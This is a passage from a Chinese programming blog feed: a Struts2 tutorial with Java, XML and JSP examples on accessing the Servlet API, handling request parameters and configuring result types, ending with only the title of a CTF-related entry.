class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>/error.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>login.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登陆页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>账号:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>密码:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;登陆&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登陆成功页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">algin</span>=<span class="hljs-string">center</span>&gt;</span>通过ActionContext类访问Servelt API<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>$&#123;success &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>用户登录信息<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>用户名:$&#123;username &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>密    码:$&#123;password &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>error.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登陆失败页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>$&#123;error &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发布项目访问login.jsp<br><img src="https://img-blog.csdnimg.cn/20210326201914583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入错误的账号密码，提示登陆失败<br><img src="https://img-blog.csdnimg.cn/20210326201922847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入正确的用户名admin和密码123456，提示登陆成功<br><img src="https://img-blog.csdnimg.cn/20210326201939672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>从返回用户信息，可以看出来，在Action中放入ActionContext的key-value键值对被提取出来了，说明struts2可以通过ActionContext类访问Servlet API。</p><h3 id="通过特定接口访问"><a href="#通过特定接口访问" class="headerlink" title="通过特定接口访问"></a>通过特定接口访问</h3><p>Struts2框架提供了ActionContext来访问Servlet API，但无法直接获得Servlet API实例，Struts2提供如下几个接口使Action可以直接访问到Servlet API：</p><table><thead><tr><th>接口</th><th>功能描述</th></tr></thead><tbody><tr><td>ServletContextAware</td><td>实现该接口的Action可以直接访问Web应用的ServletContext实例</td></tr><tr><td>ServletRequestAware</td><td>实现该接口的Action可以直接访问Web应用的ServletRequest实例</td></tr><tr><td>ServletResponseAware:</td><td>实现该接口的Action可以直接访问Web应用的ServletRsponse实例</td></tr></tbody></table><p>实例2：</p><p>AwareAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><br><span class="hljs-keyword">import</span> org.apache.struts2.interceptor.ServletRequestAware;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AwareAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ServletRequestAware</span></span>&#123;<br>HttpServletRequest request;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setServletRequest</span><span class="hljs-params">(HttpServletRequest request)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.request=request;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;通过ServletRequestAware接口实现了访问Servlet API的访问&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;AwareDemo&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;aware&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.AwareAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/message.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>message.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">algin</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>$&#123;requestScope.message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发布项目，访问aware<br><img src="https://img-blog.csdnimg.cn/20210326204201290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看出，使用ServletRequestAware接口顺利访问Servlet API了的</p><h3 id="通过ServletActionContext访问"><a href="#通过ServletActionContext访问" class="headerlink" title="通过ServletActionContext访问"></a>通过ServletActionContext访问</h3><p>Struts2还提供了一个ServletActionContext工具类用来访问Servlet API。该类包含了一下几个静态方法：</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>static PageContext getPageContext()</td><td>取得Web应用的PageContext对象</td></tr><tr><td>static HttpServletRequest getRequest()</td><td>取得Web应用的?HttpServletRequest对象</td></tr><tr><td>static HttpServletResponse getResponse()</td><td>取得Web应用的HttpServletResponse对象</td></tr><tr><td>static ServletContext getServletContext()</td><td>取得Web应用的ServletContext对象</td></tr></tbody></table><p>实例3：<br>ContextAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><br><span class="hljs-keyword">import</span> org.apache.struts2.ServletActionContext;<br><span class="hljs-keyword">import</span> org.apache.struts2.interceptor.ServletRequestAware;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ContextAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>ServletActionContext.getRequest().setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <br><span class="hljs-string">&quot;通过ServletActionContext类直接访问Servlet API&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ContextDemo&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;context&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.ContextAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/context.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>context.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">algin</span>=<span class="hljs-string">center</span>&gt;</span>$&#123;requestScope.message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发布项目，访问context<br><img src="https://img-blog.csdnimg.cn/20210326204934276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>借助ServletActionContext类的帮助，也可以在Action中直接访问Servlet API，避免了Action实现AxxAction等接口。</p><p>在开发中应优先使用ActionContext来避免和Servlet API耦合</p><h2 id="Aciton处理请求参数"><a href="#Aciton处理请求参数" class="headerlink" title="Aciton处理请求参数"></a>Aciton处理请求参数</h2><p>在Struts2中，页面的请求数据和Action有两种基本的对应方式，分别是字段驱动(FileldDriven)方式和模型驱动(ModelDriven)方式。其中，字段驱动也叫做为属性驱动。</p><h3 id="属性驱动"><a href="#属性驱动" class="headerlink" title="属性驱动"></a>属性驱动</h3><p>  1.基本数据类型字段驱动方式的数据传递:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.hjc.Action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ActionOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br><span class="hljs-keyword">private</span> String UserName;<br><span class="hljs-keyword">private</span> String PassWord;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUserName</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> UserName;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUserName</span><span class="hljs-params">(String userName)</span> </span>&#123;<br>UserName = userName;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassWord</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> PassWord;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassWord</span><span class="hljs-params">(String passWord)</span> </span>&#123;<br>PassWord = passWord;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>  2.直接使用域对象字段驱动方式的数据传递</p><h3 id="模型驱动"><a href="#模型驱动" class="headerlink" title="模型驱动"></a>模型驱动</h3><p>模型驱动，通过实现ModelDriven接口来接受请求参数，Action类必须实现接口，并且要重写getModel()方法，这个方法返回的就是Action所使用的数据模型对象。</p><h2 id="Result结果类型"><a href="#Result结果类型" class="headerlink" title="Result结果类型"></a>Result结果类型</h2><h3 id="配置-Result"><a href="#配置-Result" class="headerlink" title="配置 Result"></a>配置 Result</h3><p>result标签的属性：</p><ul><li>name属性：指定逻辑视图的名称，默认为success。</li><li>type 属性：指定返回的视图资源的类型，不同的类型代表不同的结果输出，默认值是dispatcher。</li></ul><p>struts.xml文件中<code>&lt;result&gt;</code>元素配置代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginAction&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;redirect&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loaction&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上述配置，使用了<code>&lt;result&gt;</code>元素的name、type属性和param子元素。</p><p><code>&lt;param&gt;</code>子元素的name属性有两个值,分别如下:<br>| 属性     | 描述                                                         |<br>| ——– | ———————————————————— |<br>| location | 指定该逻辑视图所对应的实际视图资源。                         |<br>| parse    | 指定在逻辑视图资源名称中是否可以使用OGNL表达式。默认值为true,表示可以使用，如果设为false,则表示不支持。 |</p><p>上面的配置可以简化为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginAction&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="预定义的结果类型"><a href="#预定义的结果类型" class="headerlink" title="预定义的结果类型"></a>预定义的结果类型</h3><table><thead><tr><th>属性</th><th>说明</th><th>对应类</th></tr></thead><tbody><tr><td>chain</td><td>用来处理Action 链</td><td>com.opensymphony.xwork2.ActionChainResult</td></tr><tr><td>dispatcher</td><td>用来转向页面，通常处理 JSP</td><td>org.apache.struts2.dispatcher.ServletDispatcherResult</td></tr><tr><td>redirect</td><td>重定向到一个URL</td><td>org.apache.struts2.dispatcher.ServletRedirectResult</td></tr><tr><td>redirectAction</td><td>重定向到一个 Action</td><td>org.apache.struts2.dispatcher.ServletActionRedirectResult</td></tr><tr><td>plainText</td><td>显示源文件内容，如文件源码</td><td>org.apache.struts2.dispatcher.PlainTextResult</td></tr><tr><td>freemarker</td><td>处理 FreeMarker 模板</td><td>org.apache.struts2.views.freemarker.FreemarkerResult</td></tr><tr><td>httpheader</td><td>控制特殊 http 行为的结果类型</td><td>org.apache.struts2.dispatcher.HttpHeaderResult</td></tr><tr><td>stream</td><td>向浏览器发送 InputSream 对象，通常用来处理文件下载，还可用于返回 AJAX 数据。</td><td>org.apache.struts2.dispatcher.StreamResult</td></tr><tr><td>velocity</td><td>处理 Velocity 模板</td><td>org.apache.struts2.dispatcher.VelocityResult</td></tr><tr><td>xslt</td><td>处理 XML/XLST 模板</td><td>org.apache.struts2.views.xslt.XSLTResult</td></tr></tbody></table><p>表中例举了Struts2中预定义的全部11种结果类型，其中dispatcher是默认的结果类型，主要用来与JSP整合。其中，dispatcher和redirect是比较常用到的结果集。</p><h3 id="dispatcher结果类型"><a href="#dispatcher结果类型" class="headerlink" title="dispatcher结果类型"></a>dispatcher结果类型</h3><p>dispatcher结果类型用来表示“转发”到指定结果资源，它是struts2默认的结果类型。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>  <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;dispatcher&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;location&quot;</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;parse&quot;</span> &gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上面的代码中，location参数用于指定Action执行完毕后要转向的目标资源；parse参数是一个布尔型的值，默认是true，表示解析location参数中的OGNL表达式。</p><h3 id="redirect结果类型"><a href="#redirect结果类型" class="headerlink" title="redirect结果类型"></a>redirect结果类型</h3><p>redirect结果类型用来重定向到新的结果资源，该资源可以是JSP文件，也可以是Action文件。</p><p>对本文上面<code>通过ActionContext类访问Servlet API</code>标题下面的struts.xml代码进行更改：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;redirect&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;dispatcher&quot;</span>&gt;</span>/error.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><p>用户名和密码正确，使用redirect重新定向到success.jsp；用户名和密码错误，使用的是dispatcher的结果类型，跳转到error.jsp。</p>]]></content>
    
    
    <categories>
      
      <category>编程开发</category>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFshow-Web入门-信息泄露</title>
    <link href="/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <url>/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    
